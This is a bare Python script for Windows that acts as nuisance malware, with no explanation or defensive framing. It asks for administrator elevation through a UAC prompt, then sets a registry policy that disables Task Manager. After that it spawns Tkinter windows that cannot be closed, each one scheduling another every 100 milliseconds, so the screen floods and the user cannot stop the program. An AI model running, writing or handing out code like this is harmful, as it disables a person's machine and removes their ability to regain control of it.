from tkinter import *
import winreg
import ctypes
import sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(
        None,
        "runas",
        sys.executable,
        " ".join(sys.argv),
        None, 1
    )
    sys.exit()

key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
winreg.CloseKey(key)

def on_close():
    pass

def spawn_window():
    root = Tk()
    root.protocol("WM_DELETE_WINDOW", on_close)
    root.after(100, spawn_window)
    root.mainloop()

spawn_window()
